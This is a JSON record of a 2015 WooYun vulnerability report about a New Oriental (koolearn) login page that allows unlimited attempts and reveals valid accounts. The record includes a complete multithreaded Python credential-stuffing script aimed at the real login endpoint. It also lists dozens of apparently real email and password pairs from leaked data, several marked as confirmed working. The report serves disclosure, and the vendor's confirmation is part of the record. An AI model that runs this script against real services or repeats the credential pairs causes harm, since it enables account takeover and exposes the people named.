{"id": 29403, "wybug_id": "wooyun-2015-0110964", "wybug_title": "新东方某登陆处设计缺陷可撞库", "wybug_corp": "新东方", "wybug_author": "jaffer", "wybug_date": "2015-04-29 20:38", "wybug_open_date": "2015-06-14 17:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向公众公开  简要描述： rt 详细说明：  地址：\nhttp://115.182.44.211/index.php/site/login\n使用koolearn账号体系登录的。虽然是教师登录，但是如果是正确的用户，会返回success。并且该登录没有做任何限制。一个简单的python脚本。email里面是邮箱与密码的组合\n#!/usr/bin/env python#-*-coding:utf-8-*-import httplib2import urllib2import urllibimport socketfrom urllib import urlopenfrom string import replace,find,lowerfrom httplib import HTTPExceptionimport timeimport threadpoolimport threadingmutex = threading.Lock()class fuzz(object):\tdef __init__(self,user_pwd,count):\t\tself.user_pwd = user_pwd\t\tself.good = []\t\tself.count = count\t\tself.threadnum = 10\tdef makePackage(self,euser,epwd):\t\turl = 'http://login.koolearn.com/sso/login.do?userName='+euser+'&password='+epwd+'&channel=wangqian&responseType=json&type=jsonp&callback=jQuery18204328589937649667_1430216268449&_=1430226430181'\t\tprint url\t\tprint euser\t\tprint epwd\t\theaders = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'}\t\ttry:\t\t\th = httplib2.Http()\t\t\tres,con = h.request(url,'GET',headers = headers)\t\t\tprint con\t\texcept:\t\t\tpass\t\ti = con.find('error')\t\tt = []\t\tif i == -1:\t\t\tif mutex.acquire():\t\t\t\tself.good.append([euser,epwd])\t\t\t\t\t\t\tmutex.release()\t\telse:\t\t\tpass\t\tdef preS(self):\t\tbase = 0\t\tfor each in self.user_pwd:\t\t\tself.makePackage(each[0],each[1][0:-1])\t\t\tif mutex.acquire():\t\t\t\tif len(self.good) != base:\t\t\t\t\tself.save()\t\t\t\t\tbase = len(self.good)\t\t\t\t\tmutex.release()\t\tdef save(self):\t\tfp = open('result','w')\t\tfor each in self.good:\t\t\tfp.writelines(each[0]+' '+each[1]+'\\n')\t\tfp.close()\t\tdef gothread(self):\t\t#建立进程池\t\tpool = threadpool.ThreadPool(self.threadnum)\t\t#两个list合并，直接相加就可以\t\tcount = 0\t\tbase = 0\t\tfor i in range(self.count):\t\t\tprint self.user_pwd[i][0]+'----user-----\\n' + self.user_pwd[i][1] + '---pass---\\n'\t\t\tif mutex.acquire():\t\t\t\tif len(self.good) != base:\t\t\t\t\tself.save()\t\t\t\t\tprint 'OK\\n'\t\t\t\t\tbase = len(self.good)\t\t\t\t\tmutex.release()\t\t\tpool.add_task(self.makePackage,self.user_pwd[i][0],self.user_pwd[i][1])\t\t#join and destroy all threads\t\tpool.destroy()\tif __name__=='__main__':\tf = open('email','r')\tup = []\tcount = 0\twhile True:\t\tline = f.readline()\t\tif line:\t\t\ti = line.find(' ')\t\t\tuser = line[0:i]\t\t\tpwd = line[i+1:]\t\t\tup.append([user,pwd])\t\t\tcount = count + 1\t\telse:\t\t\tbreak\tf.close()\ttest = fuzz(up,count)\ttest.preS()\n撞库：\ncocoa@263.net fantacy2jassonz@21cn.com caijunshunvlh@263.net lh1112lxhit@21cn.com 781120billhao@hotmail.com 888999XuZuotao@263.net.cn 751027Chinamofee@sohu.com  6y1x3caflyfly@21cn.com flying123childman@163.com chudirdwudw@263.net 556575dimpleok@hotmail.com jasmine8jouzen@163.net zhughTtiGeR@cableplus.com.cn sysop123lxy@yytvu .net 58328linwx1978@sohu.com iamjohnswith2000@21cn.com hellofair_zhj@163.net 0531fairliguodong@263.net lgd73.......\n   漏洞证明：  cocoa@263.net fantacy2\n\njassonz@21cn.com caijun\n\nbillhao@hotmail.com 888999\n\nwith2000@21cn.com hello\n\n   修复方案：  防撞库   版权声明：转载请注明来源 jaffer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-30 17:26 厂商回复： 感谢支持新东方安全，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}